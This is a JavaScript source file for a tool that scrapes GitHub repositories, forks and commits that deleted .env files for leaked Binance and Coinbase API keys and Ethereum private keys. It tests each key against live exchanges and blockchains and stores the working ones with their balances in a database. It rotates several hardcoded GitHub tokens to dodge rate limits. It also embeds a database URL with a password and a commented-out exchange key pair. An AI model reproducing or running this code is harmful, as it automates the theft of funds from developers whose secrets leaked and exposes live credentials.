import  { Octokit } from '@octokit/rest';
import moment from 'moment';
import ccxt from 'ccxt';
import Web3, { Account } from 'web3';
import mongoose, { PromiseProvider } from 'mongoose';
import GitHubRepoParser from './githubRepoParser';
import models from './models';
import Promise from 'bluebird';
import sort from 'random-sort';
import dotenvParseVariables from 'dotenv-parse-variables'
import readline from 'readline'
import { convert } from 'html-to-text';
import { parseForBinanceKeys, parseForCoinbaseKeys } from './helpers';





const Sentry = require('@sentry/node')
const Trading = require('@sentry/tracing')


Sentry.init({
  dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
  integrations: [
    // enable HTTP calls tracing
    new Sentry.Integrations.Http({ tracing: true }),
  ],

  // Set tracesSampleRate to 1.0 to capture 100%
  // of transactions for performance monitoring.
  // We recommend adjusting this value in production
  tracesSampleRate: 1.0,
});
let url_binance = 'https://bsc-dataseed.binance.org'
let url_mainnet = "https://mainnet.infura.io/v3/9e34ce9faf8b4c6ca400b914af9cb665"
let url_binance_2 = 'https://bsc-dataseed1.defibit.io/'

let tried = 0
let worked = 0
let balances = 0
let totalWei = 0
let totalEther = 0
let parserTriesBinanceKey = 0
let parserFoundBinanceKeys = 0


const networks = [url_binance, url_mainnet, url_binance_2]
const repoQueryOptions = [
  'binance trading bot',
  'crypto arbitrage',
  'python binance',
  'binance api'
]
const codeQueries = [
 'binanceApiKey',
 'ccxt.binance',
 'import binance',
 'python-binance',
 'binance api',
 'WALLET_PRIVATE_KEY'


 
]

const commitQueries = [
  'delete .env',
  'remove .env',
  'delete secrets',
  'remove secrets'
]

let jon = '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'
let thesavage = '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'
let user32 = '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'
let eaglesfan = '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'
let jonkolmanllc = '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'
let eaglesfanj365 = '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'
let jkolmanllc = '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'
let kolmanllc = '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'




let treeShas = {}
let totalEth = 0

let ghAccounts = [ eaglesfan, user32,  jon, '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', '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']
let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
let parser 


// const initExchangeghs = () => {
//   console.log(ccxt.exchanges)
// }
const initSecretKeyPrefixes = () => {
  const secretKeyPrefixes = ['secret', 'secret_key', 'api_secret', 'API_SECRET', 'SECRET_KEY', 'SECRET', 'apiSecret', 'binanceSecret', 'BINANCE_SECRET_KEY', 'binanceSecretKey', 'BINANCE_SECRET'] // these are variable name variations ive seen out in the wild people are using when naming their api key variables.
                            // I'm using these as a way to identify api keys in peoples code.
                            
  const exchangeSecretKeyPrefixes = ccxt.exchanges.map(item => {
    return [`${item}_secret_key`, `${item}APISecret`, `${item.toUpperCase()}_SECRET`, `${item}SecretKey`, `${item}secretKey`, `${item.toUpperCase()}_SECRET_KEY`, `${item}secret`, `${item}Secret`]
  })
  return [secretKeyPrefixes, ...exchangeSecretKeyPrefixes]
}

const initTopics = () => {
  let topicArray = []
   return mongoose.model('repos').find().then(async repos => {
      
      return Promise.each(repos, repo => {
        const { topics } = repo
        return Promise.each(topics, topic =>{
          return topicArray.push(topic)
        })
      }).then(() => {
        return unique(topicArray)
      }).catch(err => {
        Sentry.captureException(err)
      })
    })
}
const initApiKeyPrefixes = () => {
  const apiKeyPrefixes = ['apiKey', 'api_key', 'BINANCE_API_KEY', 'API_KEY'] // these are variable name variations ive seen out in the wild people are using when naming their api key variables.
                            // I'm using these as a way to identify api keys in peoples code.
                            
  const exchangeApiKeyPrefixes = ccxt.exchanges.map(item => {
    return [
      `${item}_api_key`, 
      `${item}_API_KEY`, 
      `${item}ApiKey`, 
      `${item}Key`,
      `${item.toUpperCase()}_api_key`, 
      `${item.toUpperCase()}_API_KEY`, 
      `${item.toUpperCase()}ApiKey`, 
      `${item.toUpperCase()}Key`
    ]
  })
  return [apiKeyPrefixes, ...exchangeApiKeyPrefixes]
}
const finalClean = arr => {
  return arr.map(item => item.replace('=', ''))
}
const initGithubAccounts = async () => {
  let accounts = []
  return Promise.map(ghAccounts, async account => {
    let temp = new Octokit({
      auth:  account
    })
    const rateLimitData = await temp.rateLimit.get()
    console.log(rateLimitData)
    //console.log(rateLimitData)
    if(rateLimitData.data.rate.remaining > 0) {
      accounts.push(temp)
    }
    else {

      console.log('account not available until', moment().fromNow(rateLimitData.data.rate.reset))
      console.log('but lets try anyway')
      accounts.push(temp)
    }
  }).then(() => {
    if(accounts.length === 0) {
      console.log('no accounts available')
      process.exit()
    }
    else {
      console.log('using', accounts.length)
    }
    return Promise.resolve(accounts)
  })
}
const unique = array => {
  return array.filter((a, b) => array.indexOf(a) ===b)
}
const clean = string => {
  return string.replace(/\s/g, "").replace(/['"]+/g, '').replace(/['']+/g, '')
}



const parseForPrivateKeys = data => {
  let regex = /16([a-zA-Z]+([0-9]+[a-zA-Z]+)+)9/g; //for identifying private keys
  let regex2 = /[0-9]+([a-zA-Z]+([0-9]+[a-zA-Z]+)+)/g; // also for identifying private keys
 
  let regexs = [regex, regex2]
  
  let privateKeys = []
  
 
  regexs.forEach(regexExpression => {
    const match = data.match(regexExpression)
    //console.log({match, regexExpression})
    if(match !== null) {
      match.forEach(potential => {
        if(potential.length === 64) {
          console.log('potential key', potential)
          privateKeys.push(potential)
        }
      })
    }
   
  })
  return Promise.resolve({privateKeys})
}



const testKeys = async keys => {
  let {privateKeys} = keys;
  if(privateKeys.length > 0) {
    console.log(privateKeys)
    Promise.all(Promise.map(privateKeys, async (key) => {
      

      return Promise.map(networks, async network => {
        let w3 = new Web3(network)
        let account
        let balance
        try {
          account = await w3.eth.accounts.privateKeyToAccount(key)
          balance = await w3.eth.getBalance(account.address)
          console.log('account worked', account)
          console.log(balance)
          mongoose.model('cryptoAccounts').create({
            address: account.address,
            balance,
            privateKey: key

          }).then(res => res.save())
        }
        catch(err) {
          //console.log('account didnt work', key)
          Sentry.captureException(err)
          return Promise.resolve(null)
        }
        if(balance > 0) {
          console.log(account)
          console.log('wei balance', balance)
        }
      else {
        console.log(account)
        console.log('but no balance balance', balance)
        }
      return Promise.resolve(key)
      })
      
  
    }))
  }
  
 
  // if(keyArray2 !== null) {
    

  //   promises.push(Promise.map(keyArray2, async (key, index) => {
       
  //       return Promise.map(networks, async network => {
  //           let w3 = new Web3(network)
  //         let account
  //         try {
  //           account = await w3.eth.query.privateKeyToAccount(key)
  //           balance = await w3.eth.getBalance(account.address)
            
  //           return Promise.resolve({account, worked:true})
          
  //         }
  //         catch(err) {
            
  //           return Promise.resolve(null)
  //         }
  //         if(balance > 0) {
  //           console.log(account)
  //           console.log('wei balance', balance)
        
          
            
  //         }
  //         else {
  //           console.log('account', account)
  //           console.log('but no balance', balance)
  //         }
  //         })
      
      
  //       }))
  //     }
  //     return Promise.all(promises)
  

}
const pickRandomUrl = urls => {
  return urls[Math.floor(Math.random() * urls.length)]
}

const checkStatus = (percentageDone) => {
  let donePercent = percentageDone.split('percentageDone')[1].split(' ')[0]
  console.log('donepercent', donePercent)
}
async function parseRepos(query,  ghAccount) {
  let urlsQueried = []
  let reposAlreadyLookedAt = 0
  let percentageDone
  setInterval(() => checkStatus(percentageDone), 12000)
  const page = 1//Math.floor(Math.random() * (10 - 1 + 1) + 1)
  console.log('query is', query, 'page is', page)
  const initialRepos = await ghAccount.rest.search.repos({
    q: query,
    order: 'asc',
    page,
    sort: 'best-match',
    per_page: 100
  })
  let nodes = initialRepos.data.items
  console.log('working with', nodes.length)
  
  let uniqueRepos = new Set(nodes)
  let uniqueRepoArray = Array.from(uniqueRepos)
  let promises = []
  //console.log(uniqueRepoArray.map(item => item))
  promises.push(Promise.map(uniqueRepoArray, async () => {
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    let repoInDb = await mongoose.model('repos').findOne({html_url: randomRepo.html_url})
    if(urlsQueried.indexOf(randomRepo.html_url) !== -1) {
      reposAlreadyLookedAt += 1
      return Promise.resolve({})
    }
   // console.log('repo in db', repoInDb)
   if(repoInDb) {
    reposAlreadyLookedAt +=1
    percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page} lookedAt: ${reposAlreadyLookedAt}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
    //console.log('skipping repo')

    //console.log(percentageDone)
    return Promise.resolve({})
   }

  
  return handleRepo(randomRepo, ghAccount).then(() => {
    urlsQueried.push(randomRepo.html_url)
    reposAlreadyLookedAt += 1
    let percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page}, lookedAt: ${reposAlreadyLookedAt},  reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
    //console.log(percentageDone)
  }).catch(err => {
    Sentry.captureException(err)
  })
    
    
  }))
  return Promise.all(promises).catch(err=> Sentry.captureException(err))

}
async function parseForks(query) {
  let gh = shuffleAccounts(query)
  const initialRepos = await gh.rest.search.repos({
    q:repoQueryOptions[Math.floor(Math.random() * repoQueryOptions.length)],
    order: 'asc',
    sort: 'committer-date',
    per_page: 1
  })
  const repoInstances = initialRepos.data.items
  return Promise.map(repoInstances, async repo => {
    let gh2 = shuffleAccounts(query) // so its harder to rate limit me
    let forks = await gh2.rest.repos.listForks({
      owner: repo.owner.login,
      repo: repo.name
    })
    const forkInstances = forks.data
    return Promise.map(forkInstances, async forkedRepo => {
      let error = false
      const gh3 = shuffleAccounts(query)
      console.log(forkedRepo.name)
      let commitsForFork
      try {
        commitsForFork = await gh3.rest.repos.listCommits({
          owner: forkedRepo.owner.login,
          repo: forkedRepo.name
        })
      }
      catch(err) {
        error = true
        console.log('error getting commits for fork', forkedRepo.name, err.status)
      }
      if(!error) {
        const commitItems = commitsForFork.data;
        Promise.map(commitItems, async commit => {
          const gh4 = shuffleAccounts(query)
          const parents = commit.parents
          return Promise.map(parents, async parent => {
            const tree = await gh4.rest.git.getTree({
              owner: forkedRepo.owner.login,
              repo: forkedRepo.name,
              tree_sha: parent.sha
            })
            const files = tree.data.tree;
            return Promise.map(files, async file => {
              const gh5 = shuffleAccounts(query)
              const content = await gh5.rest.repos.getContent({
                owner: forkedRepo.owner.login,
                repo: forkedRepo.name,
                path: file.path
              })
              return parse(content).then(testKeys)
            })
          })
        })
      }
     
    })
    
  })
  return  gh.rest.search.repos({q: query, page, order:'asc', sort: 'indexed', per_page: 100})
   .then(res => {
    console.log(query, res.data.items.length)
     let items = res.data.items
     //console.log('first', res.data.items[0])
     let missed = 0
     return Promise.map(items, async item => {
      //console.log(item)
      //console.log('item', item.name, item.html_url)
      const owner = item.owner.login
      const repoName = item.html_url.split('/')[4]
      let forks = await gh.rest.repos.listForks({
        owner,
        repo:repoName
      })
      let f = forks.data
      Promise.map(f, async fork => {
        console.log('got fork', fork !== undefined)
        let commits = await gh.rest.repos.listCommits({
          owner: fork.owner.login,
          repo: fork.name
        })
        const d = commits.data
        Promise.map(d, commit => {
          const parents = commit.parents
          Promise.map(parents, async parent => {
            const tree = await gh.rest.git.getTree({
              owner: fork.owner.login,
              repo: fork.name,
              tree_sha: parent.sha
            })
            console.log('got tree', tree !== undefined)
            const files = tree.data.tree
            Promise.map(files, async file => {
              const content = await gh.repos.getContent({
                owner: fork.owner.login,
                repo: fork.name,
                path: file.path
              })
              console.log('got content of file', content !== undefined)
              return parse(content).then(testKey)
              
            })
           
          })
        })
      })
    }).catch(err => err)
  }).catch(err => err)
}


const delay = (ms) => {
  return new Promise(resolve => setTimeout(resolve, ms));
}

   



const handleRepo = async(repo, ghAccount) => {
  
  const data = await parser.collectData(repo.html_url)
  const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
  let files = []
  let filesChecked = 0
  //console.log('data', data)
  Object.keys(data).map(k => {
    if(k === 'env') {
      console.log('env found', data[k])
    }
    if(shouldIgnore.indexOf(k) === -1) {
      
      data[k].forEach(url => {
        files.push(url)
      })
    }
   
      
    })
  files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
  let promises = []
  
  promises.push(Promise.map(files, (file, index) => {
    return ghAccount.request(`GET ${file}`).then(async res => {
      if(typeof res.data === 'object') {
       return Promise.resolve([])
      }
      let text = convert(res.data, {
        wordwrap: 130
      })
      // let base64Text = Buffer.from(res.data).toString('base64') //neccessary for parsing private keys
      // let privateKeys = await parseForPrivateKeys(base64Text)
      
      // let query = await testKeys(privateKeys)
      // console.log('got query', query)
      
      //returns an array of objects that look like {apiKey: '', secret: ''}
      // console.log(`parsing for binance keys in ${file} for ${repo.name}`)

      promises.push(parseForCoinbaseKeys(text).then(keys => {
        let testedTokens = []
        
        const {secrets, tokens} = keys;
        testedTokens.push(Promise.map(tokens, async token => {
         return Promise.each(secrets, async secret => {
            let combo = {apiKey: token, secret}
            console.log(combo)
            console.log('-----trying----', combo)
            try {
              const coinbase = new ccxt.coinbase({
                apiKey: combo.apiKey,
                secret: combo.secret
              })
              const balance = await coinbase.fetchBalance()
              console.log('coinbase balance', balance)
             return mongoose.model('coinbaseAccounts').create({
                apiKey: combo.token,
                secret: combo.secret
              }).then(res => res.save()).then(combo => {
                console.log('new account for coinbase created in mongo', combo)
              })

            }
            catch(err) {
              Sentry.captureException(err)
            }
            })
          

        }))
        return Promise.all(testedTokens)

      }))
      promises.push(
        parseForPrivateKeys(text).then(keys => {
          // console.log('got private keys', keys)
          return testKeys(keys)
        })
      )
      promises.push(
        parseForBinanceKeys(text).then(keys => {
          // console.log('found binance keys', keys)
            const {secrets, tokens} = keys
            let testedCombos = []
        
          testedCombos.push(Promise.map(tokens, async token => {
            return Promise.each(secrets, async secret => {
              let combo = {apiKey: token, secret}
              console.log('------trying------', combo)
              try {
                const binance = new ccxt.binance(combo)
                const balance = await binance.fetchBalance()
                console.log('account works', combo)
                const {free} = balance
                let cryptos = Object.keys(free).map(k => {
                    let balanceForCrypto = free[k]
                    if(balanceForCrypto > 0) {
                        return {crypto: k, balance: free[k]}
                    }
                    else {
                        return null
                    }
                }).filter(item => item !== null)
                console.log('cryptos', cryptos)
               return mongoose.model('binanceAccounts').create({
                  token: combo.apiKey,
                  secret: combo.secret,
                  cryptos
  
                }).then(doc => {
                  return doc.save()
                })
                
              }
              catch(err) {
                console.log(`wrong credentials token ${combo.apiKey} secret: ${combo.secret}`)
                console.log('repo was', repo.name)
               return mongoose.model('binanceAccounts').create({
                  token: combo.apiKey,
                  secret: combo.secret,
                  cryptos: []
  
                }).then(doc => doc.save())
                
              }
                })
             }))
             return Promise.all(testedCombos).catch(err => Sentry.captureException(err))
          }))
          return Promise.all(promises).catch(err => Sentry.captureException(err)).delay(5000)
    })
      
  }))
  return Promise.all(promises).catch(err => Sentry.captureException(err))
}
const fetchCode = async (query, page) => {
  let reposAlreadyLookedAt = 0
  
  let urlsQueried = []

  const code = await gh.rest.search.code({
    q: query,
    order: 'desc',
    sort: 'best-match',
    per_page: 100,
    page
  }).catch(err => err)
  let codeItems
  try {
    codeItems = code.data.items;
    //console.log('working with', code.data.items.length)
    
    //console.log(code.data.items[0])
  }
  catch(err) {
    console.log('error caught', err)
    return Promise.resolve([])
  }
 
  const uniqueRepos = new Set(codeItems.map(item => item.repository))
  let uniqueRepoArray = Array.from(uniqueRepos)
 

  //console.log(uniqueRepoArray.map(item => item))
  return Promise.each(uniqueRepoArray, async (repo, index) => {
    
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    console.log('picked url', randomRepo.html_url)
    if(urlsQueried.indexOf(randomRepo.html_url) !== -1) {
      return Promise.resolve(null)
    }
    
   return mongoose.model('repos').findOne({repo: {id: randomRepo.id}}).then(repo => {
    // console.log('found repo in db', repo !== null)
      if(repo === false) {
        reposAlreadyLookedAt += 1
        return Promise.resolve(repo)
      }
      else {
        // console.log('repo is', repo)
        reposAlreadyLookedAt +=1
        let percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, totalRepos: ${uniqueRepoArray.length}, lookedAt: ${urlsQueried.length}, url: ${randomRepo.html_url} `;
        
        return handleRepo(randomRepo, percentageDone).then(() => {
          urlsQueried.push(randomRepo.html_url)
        }).catch(err => Sentry.captureException(err))
      }
    }).catch(err => Sentry.captureException(err))
  }).catch(err => Sentry.captureException(err))

}
async function parseCode(query) {
  console.log('running for query', query)
  fetchCode(query,  Math.floor(Math.random() * (10 - 1 + 1) + 1) )
  
}
async function parseCommits(query) {
  const q = commitQueries[Math.floor(Math.random() * commitQueries.length)]
  const page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
  console.log('running for commits. Query is:', q)
  console.log('page is:', page)

  const commits = await gh.rest.search.commits({
    q,
    order: 'asc',
    per_page: 100,
    page
  })
  const commitItems = commits.data.items;
  
  //console.log('got commit', commit)
  return Promise.each(commitItems, async (commit, index) => {
    return gh.request(`GET ${commit.url}`).then(res => {
      const dotEnv = res.data.files.find(file => file.filename === '.env')
      if(dotEnv) {
        console.log('dot env found')
        return gh.rest.git.getBlob({
          owner: commit.repository.owner.login,
          repo: commit.repository.name,
          file_sha: dotEnv.sha
        }).then(res => {
          const {data:{content}} = res;
          let c = Buffer.from(content, 'base64').toString('ascii')
          console.log('full dotenv')
          console.log(c)
          console.log('end of dotenv')
         
          return parseForBinanceKeys(c).then(res => {
            console.log('binance keys', res)
          })
        })
      }
      
      return Promise.each(res.data.files, (file, index) => {
        return gh.rest.git.getBlob({
          owner: commit.repository.owner.login,
          repo: commit.repository.name,
          file_sha: file.sha
        }).then(res => {
          const {data:{content}} = res;
          let c = Buffer.from(content, 'base64').toString('ascii')
          return parse(c).then(testKeys)
        })
      }).catch(console.log)
    })
      
  })
  
  // gh.rest.repos.getContent({
  //   repo: commit.repository.name,
  //   owner: commit.repository.owner.login,
  //   path: '.env'
  // }).then(res => {
  //   console.log(res)
  //   let content = new Buffer.from(res.data.content).toString('base64')
  //   console.log(content)
  //   //return parse(content).then(console.log)
  // }).catch(console.log)
  // let repos = commitItems.map(item => item.repository)
  // return Promise.each(repos, (repo, index) => {
  //   handleRepo(repo).then(() => {
  //     console.log('repo parse %', index/repos.length)
  //   })
  // })
}

const runAction = (actionType, query, ghAccount) => {
  switch(actionType) {
    case 'parseCode':
      return parseCode(query).catch(console.log)
    case 'parseForks':
      return parseForks(query)
    case 'parseRepos':
      return parseRepos(query, ghAccount)
    case 'parseCommits':
      return parseCommits(query)
    default:
      parseRepos(query)
  }
}
const start =  async page => {
  process.on('uncaughtException', (err) => Sentry.captureException(err))
  process.on('unhandledRejection', (err) => {
    console.log(err)
    Sentry.captureException(err)
  })
  
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    console.log('connected to db')
    let queriesRunning = []
    //return runAction('parseCommits')
    //const prefixes = initApiKeyPrefixes().reduce((a, b) => [...a, ...b])
    const min = 0
    const max = 1000
    const randNum = Math.floor(Math.random() * (max - min))
    console.log('random number', randNum)
    mongoose.model('repos').findOne({ topics: { $exists: true, $not: {$size: 0} } }).skip(randNum).then(res => {
      const {topics} = res;
        // console.log('topics length', topics.length)
        const query = topics[Math.floor(Math.random() * topics.length)]
        // console.log('running action parse repos with', query)
        initGithubAccounts().then(accounts => {
          console.log('got accounts', accounts.length)
          let ghAccount = accounts[0]
          parser = new GitHubRepoParser(ghAccount)
          runAction('parseRepos', query, ghAccount)
        })
       
      })
    })
    // initTopics().then(topics => {
    
  }

   
    
      
    // mongoose.model('binanceAccounts').create({
      
    //     token: 'zyN3R5T1FOPwKLBvxnf09X6EkKzcIEBCes1RpNqD6moXU7YoqOBX3M2vFcUgCAQy',        
    //     secret: 'dQMgSnNJs3MrBvU5qx65WYmn7PIAK9o0LLjLLVmPicjjCsWTA3iFA6H9UwDKn55h',       
    //     cryptos: [
    //       { crypto: 'BTC', balance: 0.00754945 },
    //       { crypto: 'USDT', balance: 75.82065341 },
    //       { crypto: 'MATIC', balance: 35.8641 },
    //       { crypto: 'BUSD', balance: 113.1459823 },
    //       { crypto: 'SAND', balance: 9.98071452 },
    //       { crypto: 'LUNA', balance: 0.13644845 },
    //       { crypto: 'LUNC', balance: 0.00253 }
    //     ],
       
      
    // }).then(doc => {
    //   console.log('got doc', doc)
    //   return doc.save()
    // }).then(console.log)
    // mongoose.model('binanceAccounts').find().then(doc => {
    //   console.log('got doc', doc)
      
    // })
    //  for(let i=0; i< 5; i++) {
    //   let action = actionTypes[Math.floor(Math.random() * actionTypes.length)]
     
    //   runAction(action)
    //  }
    
   


start()